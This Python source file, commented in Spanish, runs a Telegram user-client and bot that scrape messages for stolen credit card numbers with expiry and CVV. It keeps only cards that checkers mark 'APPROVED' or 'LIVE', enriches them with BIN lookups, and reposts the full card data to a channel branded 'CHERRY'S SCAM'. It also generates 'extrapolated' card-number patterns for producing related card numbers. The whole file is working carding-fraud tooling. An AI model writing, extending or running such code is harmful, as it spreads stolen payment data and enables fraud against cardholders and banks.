import os
import re
import time
import random
import asyncio
import aiohttp
import telebot
import unicodedata
from telethon.sync import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import Message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# ------------------- CONFIGURACIÓN -------------------
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
SESSION_STRING = os.getenv("SESSION_STRING")

if not all([API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, SESSION_STRING]):
    raise ValueError("Faltan variables de entorno")

IMAGES_URL = [
    'https://i.pinimg.com/736x/38/5a/2f/385a2f9f39beb724959faa4c46a0ebbf.jpg',
    'https://i.pinimg.com/736x/4d/34/a4/4d34a4c55bdc990cb93be3197ed59d05.jpg',
    'https://i.pinimg.com/736x/b7/14/f0/b714f0ba6f3c087c5a1a3073d8f62f45.jpg',
    'https://i.pinimg.com/736x/eb/e7/01/ebe70174388848d7f0f6eb458624a660.jpg',
    'https://i.pinimg.com/736x/59/c5/9f/59c59f3baf4f0a66709d66556612aeea.jpg',
]

bot = telebot.TeleBot(BOT_TOKEN)
processed_cards = set()
cards_in_progress = set()
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ------------------- FUNCIONES AUXILIARES -------------------
def normalize_text(text: str) -> str:
    """Convierte caracteres UNICODE a ASCII normal"""
    text = re.sub(r'\|\|([^|]+)\|\|', r'\1', text)
    text = unicodedata.normalize('NFKD', text)
    text = text.encode('ASCII', 'ignore').decode('ASCII')
    text = text.upper()
    return text

def clean_text(text: str) -> str:
    if not text or text == "Not Found":
        return text
    cleaned = re.sub(r'[\*\`"\']', '', text)
    cleaned = re.sub(r'[⚡💳✅✓]', '', cleaned)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def extract_field_advanced(text: str, field_names: list, default="Not Found") -> str:
    """
    Extrae un campo del texto buscando múltiples nombres y separadores.
    Ej: "Result ↠ Card Issuer Declined CVV" -> "Card Issuer Declined CVV"
    """
    # Construir patrón con todos los nombres posibles
    pattern = r'(?:' + '|'.join(field_names) + r')\s*[:|»➸↠\-–—]\s*([^\n\r]+)'
    match = re.search(pattern, text, re.IGNORECASE)
    if match:
        return clean_text(match.group(1).strip())
    return default

def extract_gateway_advanced(text: str) -> str:
    """Extrae el gateway de forma MUY flexible"""
    gateway = "Not Found"
    
    # 1. Buscar campos etiquetados con diferentes nombres y separadores
    gateway_patterns = [
        r'(?:GATEWAY|GATE|PASARELA|𝙂𝙖𝙩𝙚𝙬𝙖𝙮|𝗚𝗮𝘁𝗲|𝐆𝐚𝐭𝐞𝐰𝐚𝐲)\s*[:|»➸↠\-–—]\s*([^\n\r]+)',
        r'⚡\s*Gat[ée]\s*[:|»➸↠\-–—]\s*([^\n\r]+)',
        r'⚡\s*Gate[wy]?\s*[:|»➸↠\-–—]\s*([^\n\r]+)',
        r'#([A-Za-z0-9_\s|]+)',  # #Stripe | Auth
    ]
    
    for pattern in gateway_patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            gateway = clean_text(match.group(1).strip())
            # Si capturó un número de tarjeta, descartar
            if re.search(r'\d{14,16}', gateway):
                continue
            # Limpiar caracteres extraños
            gateway = re.sub(r'[•◆◇▪▫]', '', gateway).strip()
            break
    
    # 2. Si no se encontró, buscar palabras clave de gateway
    if gateway == "Not Found":
        gateway_keywords = r'\b(BRAINTREE|STRIPE|ADYEN|PAYFLOW|EAGLE|CHECKOUT|AUTH|GATEWAY|CHECKER|CHK|PLUG|VITAL|AUTHORIZE|AUTHORIZED|SHOPIFY|ZAREK|GATE|PASARELA)\b'
        keywords = re.findall(gateway_keywords, text, re.IGNORECASE)
        if keywords:
            seen = set()
            unique = [kw for kw in keywords if not (kw in seen or seen.add(kw))]
            gateway = ' | '.join(unique)
            gateway = clean_text(gateway)
    
    return gateway

async def get_bin_info(bin_number: str) -> dict:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as resp:
                if resp.status == 200:
                    return await resp.json()
    except Exception as e:
        print(f"Error BIN: {e}")
    return {"brand": "N/A", "type": "N/A", "level": "N/A",
            "bank": "N/A", "country_name": "N/A", "country_flag": "❓"}

def extract_card_info(text: str) -> dict | None:
    text_normalized = normalize_text(text)
    
    print("\n--- Procesando mensaje ---")
    print(text[:500] + "..." if len(text) > 500 else text)
    print("---")
    print(f"TEXTO NORMALIZADO: {text_normalized[:200]}...")

    # ---------- PATRONES CC ----------
    card_patterns = [
        r'(\d{14,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{14,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(?:CC|CARD)\s*[:|»➸↠\-–—]\s*(\d{14,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{14,16})\s*[|]\s*(\d{1,2})\s*[|]\s*(\d{2,4})\s*[|]\s*(\d{3,4})',
        r'(\d{14,16})-(\d{1,2})-(\d{2,4})-(\d{3,4})',
    ]
    
    match_cc = None
    for pat in card_patterns:
        match_cc = re.search(pat, text, re.IGNORECASE)
        if match_cc:
            break
    
    if not match_cc:
        print("❌ No se encontró tarjeta")
        return None

    cc, month, year, cvv = match_cc.groups()
    card_info = f"{cc}|{month}|{year}|{cvv}"
    bin_num = cc[:6]

    # ---------- FILTRADO DE APROBACIÓN ----------
    success_keywords = r'(?:APPROVED|APROBADA|LIVE|CHARGED|CHARGE|AUTH|AUTHORIZED|ADDED|SUCCESSFUL|EXITOSA|COMPLETED|ACCEPTED|CCN LIVE|CARD LIVE|CVV LIVE)'
    reject_keywords = r'DEAD|DENIED|REJECTED|ERROR|INCORRECT|TIMEOUT|DECLINED|EXPIRED|FAILED|INSUFFICIENT'

    has_success = re.search(success_keywords, text_normalized, re.IGNORECASE)
    has_reject = re.search(reject_keywords, text_normalized, re.IGNORECASE)

    if not has_success:
        print("❌ No se encontró aprobación o LIVE")
        return None
    if has_reject:
        print("❌ Se encontró rechazo")
        return None

    print("✅ APROBADO/LIVE DETECTADO!")

    # ---------- EXTRACCIÓN DE GATEWAY (MEJORADA) ----------
    gateway = extract_gateway_advanced(text)
    print(f"Gateway detectado: {gateway}")

    # ---------- EXTRACCIÓN DE STATUS ----------
    status = "Approved ✓"
    if re.search(r'\bLIVE\b', text_normalized):
        status = "Live ✓"
    
    # Buscar status en campos etiquetados
    status_match = extract_field_advanced(text, ['STATUS', 'RESULT', 'ESTADO', '𝙎𝙩𝙖𝙩𝙪𝙨', '𝗦𝘁𝗮𝘁𝘂𝘀', '𝐒𝐭𝐚𝐭𝐮𝐬', '𝐑𝐞𝐬𝐮𝐥𝐭'])
    if status_match != "Not Found":
        status = status_match

    # ---------- EXTRACCIÓN DE RESPONSE ----------
    # Buscar en campos como "Result", "Response", "Message"
    response = extract_field_advanced(text, ['RESPONSE', 'RESULT', 'MESSAGE', '𝙍𝙚𝙨𝙪𝙡𝙩', '𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲', '𝐌𝐞𝐬𝐬𝐚𝐠𝐞'])
    if response == "Not Found":
        # Buscar específicamente "Result ↠ ..."
        result_match = re.search(r'Result\s*[↠»➸]\s*([^\n\r]+)', text, re.IGNORECASE)
        if result_match:
            response = clean_text(result_match.group(1).strip())
    # Limpiar el response de números al inicio
    if response != "Not Found":
        response = re.sub(r'^\d+\s*[:|»➸]\s*', '', response).strip()
    print(f"Response detectado: {response}")

    # ---------- EXTRACCIÓN DE BANK ----------
    bank = extract_field_advanced(text, ['BANK', 'ISSUING BANK', 'BANCO', '𝘽𝗮𝗻𝗸', '𝗜𝘀𝘀𝘂𝗲𝗿', '𝐁𝐚𝐧𝐤'])
    if bank == "Not Found":
        # Buscar en "Bin Info" o similar
        bin_info_match = re.search(r'(?:BIN INFO|BIN|INFO|INFORMACION)\s*[:|»➸↠\-–—]\s*([^\n\r]+)', text, re.IGNORECASE)
        if bin_info_match:
            bin_text = bin_info_match.group(1).strip()
            # Extraer banco de "Bank ↠ JPMORGAN CHASE BANK N.A. - DEBIT"
            bank_match = re.search(r'Bank\s*[↠»➸]\s*([^\n\r]+)', bin_text, re.IGNORECASE)
            if bank_match:
                bank = clean_text(bank_match.group(1).strip())
    print(f"Bank detectado: {bank}")

    # ---------- EXTRACCIÓN DE COUNTRY ----------
    country = "Not Found"
    flag = "❓"
    country_match = extract_field_advanced(text, ['COUNTRY', 'PAIS', '𝘾𝙤𝙪𝙣𝙩𝙧𝙮', '𝗖𝗼𝘂𝗻𝘁𝗿𝘆', '𝐂𝐨𝐮𝐧𝐭𝐫𝐲'])
    if country_match != "Not Found":
        country = country_match
        flag_match = re.search(r'([\U0001F1E6-\U0001F1FF]+)', country)
        if flag_match:
            flag = flag_match.group(1)
            country = re.sub(r'[\U0001F1E6-\U0001F1FF]+', '', country).strip()
    else:
        # Buscar en Bin Info
        bin_info_match = re.search(r'(?:BIN INFO|BIN|INFO|INFORMACION)\s*[:|»➸↠\-–—]\s*([^\n\r]+)', text, re.IGNORECASE)
        if bin_info_match:
            bin_text = bin_info_match.group(1).strip()
            country_match = re.search(r'Country\s*[↠»➸]\s*([^\n\r]+)', bin_text, re.IGNORECASE)
            if country_match:
                country = clean_text(country_match.group(1).strip())
                flag_match = re.search(r'([\U0001F1E6-\U0001F1FF]+)', country)
                if flag_match:
                    flag = flag_match.group(1)
                    country = re.sub(r'[\U0001F1E6-\U0001F1FF]+', '', country).strip()
    print(f"Country detectado: {country}")

    # ---------- EXTRACCIÓN DE BRAND, TYPE, LEVEL ----------
    brand = "Unknown"
    card_type = "Unknown"
    level = "Unknown"
    
    # Buscar en Bin Info
    bin_info_match = re.search(r'(?:BIN INFO|BIN|INFO|INFORMACION)\s*[:|»➸↠\-–—]\s*([^\n\r]+)', text, re.IGNORECASE)
    if bin_info_match:
        bin_text = bin_info_match.group(1).strip()
        
        # Extraer Brand
        brand_match = re.search(r'Brand\s*[↠»➸]\s*([^\n\r]+)', bin_text, re.IGNORECASE)
        if brand_match:
            brand = clean_text(brand_match.group(1).strip())
        else:
            # Si no hay etiqueta "Brand", buscar palabras clave
            brand_match = re.search(r'(VISA|MASTERCARD|AMEX|DISCOVER)', bin_text, re.IGNORECASE)
            if brand_match:
                brand = brand_match.group(1).upper()
        
        # Extraer Type
        type_match = re.search(r'Type\s*[↠»➸]\s*([^\n\r]+)', bin_text, re.IGNORECASE)
        if type_match:
            card_type = clean_text(type_match.group(1).strip())
        
        # Extraer Level
        level_match = re.search(r'Level\s*[↠»➸]\s*([^\n\r]+)', bin_text, re.IGNORECASE)
        if level_match:
            level = clean_text(level_match.group(1).strip())
    else:
        # Buscar campos sueltos
        brand_match = re.search(r'Brand\s*[↠»➸]\s*([^\n\r]+)', text, re.IGNORECASE)
        if brand_match:
            brand = clean_text(brand_match.group(1).strip())
        
        type_match = re.search(r'Type\s*[↠»➸]\s*([^\n\r]+)', text, re.IGNORECASE)
        if type_match:
            card_type = clean_text(type_match.group(1).strip())
        
        level_match = re.search(r'Level\s*[↠»➸]\s*([^\n\r]+)', text, re.IGNORECASE)
        if level_match:
            level = clean_text(level_match.group(1).strip())

    return {
        "card_info": card_info,
        "bin_number": bin_num,
        "status": status,
        "response": response,
        "gateway": gateway,
        "brand": brand,
        "type": card_type,
        "level": level,
        "bank": bank,
        "country": country,
        "flag": flag,
    }

def generate_extrapolated(card_info: str) -> tuple:
    cc, month, year, cvv = card_info.split('|')
    cc1 = cc[:12] + 'xxxx'
    ext1 = f"{cc1}|{month}|{year}|rnd"
    rand_digit = random.randint(0, 9)
    cc2 = cc[:11] + str(rand_digit) + 'xxxx'
    ext2 = f"{cc2}|{month}|{year}|rnd"
    rand_digits = random.randint(10, 99)
    cc3 = cc[:10] + str(rand_digits) + 'xxxx'
    ext3 = f"{cc3}|{month}|{year}|rnd"
    return ext1, ext2, ext3

# ------------------- MANEJADOR -------------------
@client.on(events.NewMessage())
@client.on(events.MessageEdited())
async def handler(event):
    global processed_cards, cards_in_progress

    msg: Message = event.message
    if not msg.text:
        return

    card_data = extract_card_info(msg.text)
    if not card_data:
        return

    card_full = card_data['card_info']
    card_clean = re.sub(r'[\s|-]', '', card_full)

    if card_clean in processed_cards:
        print(f"Tarjeta {card_clean} ya procesada")
        return
    if card_clean in cards_in_progress:
        print(f"Tarjeta {card_clean} en proceso")
        return

    cards_in_progress.add(card_clean)

    try:
        bin_info_api = await get_bin_info(card_data['bin_number'])
        if bin_info_api.get('brand') and bin_info_api['brand'] != 'N/A':
            card_data['brand'] = clean_text(bin_info_api['brand'])
        if bin_info_api.get('type') and bin_info_api['type'] != 'N/A':
            card_data['type'] = clean_text(bin_info_api['type'])
        if bin_info_api.get('level') and bin_info_api['level'] != 'N/A':
            card_data['level'] = clean_text(bin_info_api['level'])
        if bin_info_api.get('bank') and bin_info_api['bank'] != 'N/A':
            card_data['bank'] = clean_text(bin_info_api['bank'])
        if bin_info_api.get('country_name') and bin_info_api['country_name'] != 'N/A':
            card_data['country'] = clean_text(bin_info_api['country_name'])
        if bin_info_api.get('country_flag') and bin_info_api['country_flag'] != '❓':
            card_data['flag'] = bin_info_api['country_flag']

        ext1, ext2, ext3 = generate_extrapolated(card_full)

        custom_message = f"""
✸  𝗖𝗛𝗘𝗥𝗥𝗬'𝗦  𝗦𝗖𝗔𝗠  — [#BIN{card_data['bin_number']}]

✦  |  𝗖𝗖 →  <code>{card_data['card_info']}</code>  
✦  |  𝗦𝗧𝗔𝗧𝗨𝗦 → {card_data['status']}
✦  |  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 → {card_data['gateway']}    
✦  |  𝗦𝗖𝗔𝗠 𝗗𝗔𝗧𝗘 → {time.strftime('%d - %m - %Y')}

︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶
⊹    |  𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → {card_data['response']}
⊹    |  𝗖𝗔𝗥𝗗 𝗜𝗡𝗙𝗢 → {card_data['bank']}
⊹    |  𝗕𝗔𝗡𝗞 → {card_data['brand']}
⊹    |  𝗖𝗢𝗨𝗡𝗧𝗥𝗬 → {card_data['country']} [{card_data['flag']}]
 
︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶

 𐔌    ．⠀𝖣𝖠𝖳𝖠 𝖡𝖠𝖲𝖤 𝖤𝖷𝖳𝖱𝖠𝖲

⇢ <code>{ext1}</code>  
⇢ <code>{ext2}</code>   
⇢ <code>{ext3}</code> 
"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton("𖥻 INFO", url="https://t.me/infocherrys"),
             InlineKeyboardButton("𖥻 REFES", url="https://t.me/+oS0yU_A2yGxjMjQ0")],
        ])

        image_url = random.choice(IMAGES_URL)

        for attempt in range(3):
            try:
                await asyncio.to_thread(
                    bot.send_photo,
                    CHANNEL_ID,
                    image_url,
                    caption=custom_message,
                    reply_markup=keyboard,
                    parse_mode='HTML'
                )
                print(f"✅ Mensaje enviado para tarjeta {card_clean}")
                processed_cards.add(card_clean)
                break
            except telebot.apihelper.ApiException as e:
                if 'Too Many Requests' in str(e):
                    print(f"Rate limit, esperando 5s... (intento {attempt+1}/3)")
                    await asyncio.sleep(5)
                elif attempt < 2:
                    await asyncio.sleep(3)
                else:
                    print(f"❌ Fallo: {e}")
            except Exception as e:
                print(f"❌ Error: {e}")
                break
    finally:
        cards_in_progress.discard(card_clean)

# ------------------- ARRANQUE -------------------
async def main():
    print("Iniciando cliente...")
    await client.start()
    print("¡Bot en ejecución! 🍒")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
